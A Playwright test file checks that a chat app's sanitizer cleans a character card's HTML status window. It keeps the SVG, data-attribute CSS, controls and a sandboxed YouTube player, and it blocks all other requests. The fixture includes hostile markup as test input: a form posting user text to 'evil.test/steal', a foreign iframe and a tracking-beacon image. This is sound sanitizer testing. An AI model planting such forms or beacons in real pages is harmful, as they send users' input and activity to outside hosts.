import { expect, test } from '@playwright/test';
import { seedSession } from '../seedSession.js';

/**
 * A card's status window drawn as RisuAI draws it (ARCHITECTURE §8.1
 * 새니타이즈): its inline SVG icon painted with its own gradient, a stylesheet
 * that selects on its `data-*`, a dropdown, a text field, a YouTube player —
 * and beside them what must not work: a form that would send the field away, a
 * frame and a picture from another host. Every request the page makes is
 * watched: only our origin and YouTube's player (stood in for) may be asked.
 */

const origin = process.env['E2E_WEB_URL'] ?? 'http://localhost:13000';
const PLAYER = 'https://www.youtube.com/embed/dQw4w9WgXcQ';

const card = [
  '<style>',
  '.hud { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }',
  '.hud[data-mood="tense"] .label { color: rgb(248, 113, 113); }',
  '.hud .ring .fill { fill: none; stroke: url(#hud-grad); stroke-width: 4; }',
  '</style>',
  '<div class="hud" data-mood="tense" role="group" aria-label="루미의 상태">',
  '<svg class="ring" viewBox="0 0 36 36" width="36" height="36" aria-hidden="true">',
  '<defs><linearGradient id="hud-grad"><stop offset="0%" stop-color="#7c3aed"/><stop offset="100%" stop-color="#d8b4fe"/></linearGradient></defs>',
  '<circle class="fill" cx="18" cy="18" r="16"/></svg>',
  '<span class="label">HP 72</span>',
  '<select name="move" aria-label="행동"><option value="rest" selected>쉰다</option><option value="go">나간다</option></select>',
  '<form action="https://evil.test/steal" method="post"><input type="text" name="note" placeholder="메모"></form>',
  `<iframe src="${PLAYER}" width="320" height="180" title="테마곡" allow="camera; microphone"></iframe>`,
  '<iframe src="https://evil.test/frame" title="남의 창"></iframe>',
  '<img src="https://evil.test/beacon.png" alt="비콘">',
  '</div>',
].join('\n');

test('a status window with SVG, data-driven CSS, controls and a YouTube player, and no request elsewhere', async ({ page }) => {
  const elsewhere: string[] = [];
  const players: string[] = [];
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.origin === new URL(origin).origin) return route.continue();
    if (url.origin === 'https://www.youtube.com') {
      players.push(url.href);
      return route.fulfill({
        status: 200,
        contentType: 'text/html; charset=utf-8',
        body: '<!doctype html><title>player</title><p id="stand-in">플레이어</p>',
      });
    }
    elsewhere.push(url.href);
    return route.abort();
  });

  await seedSession(page);
  const headers = { origin };
  const plot = await page.request.post(`${origin}/api/plots`, {
    headers,
    data: { name: `상태창 ${Date.now()}`, description: '눈 덮인 여관', intros: [card] },
  });
  expect(plot.ok(), await plot.text()).toBe(true);
  const chat = await page.request.post(`${origin}/api/chats`, { headers, data: { plotId: (await plot.json()).id, model: 'echo/echo' } });
  expect(chat.ok(), await chat.text()).toBe(true);
  const { chat: { id } } = await chat.json();
  await page.goto(`/ko/chats/${id}`);

  const hud = page.getByTestId('message-assistant').first().locator('.shizue-msg .x-shizue-hud');
  await expect(hud).toBeVisible();
  await expect(hud).toHaveAttribute('aria-label', '루미의 상태');

  // The icon is drawn, and its ring is painted with its own gradient.
  const ring = hud.locator('svg.x-shizue-ring');
  await expect(ring).toBeVisible();
  expect((await ring.boundingBox())?.width).toBeGreaterThanOrEqual(30);
  await expect(hud.locator('circle.x-shizue-fill')).toHaveCSS('stroke', /url\("?#x-shizue-hud-grad"?\)/);
  expect(await hud.locator('linearGradient').getAttribute('id')).toBe('x-shizue-hud-grad');

  // The sheet selects on the card's own data attribute.
  await expect(hud.locator('.x-shizue-label')).toHaveCSS('color', 'rgb(248, 113, 113)');

  // The dropdown works.
  const select = hud.getByRole('combobox', { name: '행동' });
  await select.selectOption('go');
  await expect(select).toHaveValue('go');

  // The text field takes typing, and Enter in it sends nothing anywhere: the form is gone.
  await expect(hud.locator('form')).toHaveCount(0);
  const at = page.url();
  const note = hud.getByPlaceholder('메모');
  await note.fill('비밀');
  await note.press('Enter');
  await page.waitForTimeout(500);
  expect(page.url()).toBe(at);
  await expect(note).toHaveValue('비밀');

  // The player, under our sandbox and permissions rather than the card's; the other frame and the beacon are gone.
  const frame = hud.locator('iframe');
  await expect(frame).toHaveCount(1);
  await expect(frame).toHaveAttribute('src', PLAYER);
  await expect(frame).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin');
  await expect(frame).toHaveAttribute('allow', 'autoplay; encrypted-media; fullscreen; picture-in-picture');
  await frame.scrollIntoViewIfNeeded();
  await expect(page.frameLocator('iframe[title="테마곡"]').locator('#stand-in')).toHaveText('플레이어');
  await expect(hud.locator('img')).toHaveCount(0);

  expect([...new Set(players)]).toEqual([PLAYER]);
  expect(elsewhere).toEqual([]);

  // Last, since the navigation it refuses stays pending for Playwright: the page's
  // policy refuses a submission even from a form of the page's own making.
  const refused = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        document.addEventListener('securitypolicyviolation', (event) => resolve(event.effectiveDirective), { once: true });
        const form = document.createElement('form');
        form.action = location.href;
        const field = document.createElement('input');
        field.name = 'q';
        field.value = '비밀';
        form.append(field);
        document.body.append(form);
        form.submit();
        setTimeout(() => resolve('submitted'), 3000);
      }),
  );
  expect(refused).toBe('form-action');
  expect(page.url()).toBe(at);
});
